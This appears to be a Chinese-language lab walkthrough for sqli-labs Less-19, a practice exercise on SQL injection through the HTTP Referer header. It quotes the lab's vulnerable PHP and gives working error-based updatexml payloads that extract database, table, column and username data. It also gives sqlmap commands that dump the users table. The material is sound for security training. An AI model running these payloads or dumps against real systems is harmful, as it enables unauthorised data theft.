---
title: less19
url: https://www.yuque.com/u29002979/ep2zrx/ro4t2irmar3i3pv2
---

```bash
$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
	$result1 = mysql_query($sql);
	$row1 = mysql_fetch_array($result1);
		if($row1)
			{
			echo '<font color= "#FFFF00" font size = 3 >';
			$insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";
```


成功登录后返回referer位置，说明在**数据包头referer位置有**注入点

> Your IP ADDRESS is: 192.168.31.119
> Your **Referer** is: http://192.168.31.193/Less-19/

<a name="NTGzZ"></a>

# 报错注入

<a name="X6iZN"></a>

## 爆破数据库名

`1',updatexml(1,concat(0x7e,database(),0x7e),1))#`

> Your IP ADDRESS is: 192.168.31.119
> Your Referer is: 1',updatexml(1,concat(0x7e,database(),0x7e),1))#
> XPATH syntax error: '~security~'

<a name="hycyr"></a>

## 爆破数据表名

`1',updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1))#` <a name="zblHG"></a>

## 爆破字段名

`1', updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' limit 8,1),0x7e),1)) -- +` <a name="IHMXL"></a>

## 爆破字段

`1', updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)) -- +` <a name="gX5ct"></a>

# sqlmap

将数据包保存后 在referer后面加上*即可

```bash
POST /Less-19/ HTTP/1.1
Host: 192.168.31.193
Content-Length: 24
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.31.193
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.31.193/Less-19/*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

passwd=admin&uname=admin
```

```bash
检测注入点
sqlmap -r 2.txt --batch --level 4
爆破数据库名
sqlmap -r 2.txt --batch --level 4 --current-db
爆破数据表名
sqlmap -r 2.txt --batch --level 4 -D "security" --tables
爆破字段内容
sqlmap -r 2.txt --batch --level 4 -D "security" -T "users" --dump
```
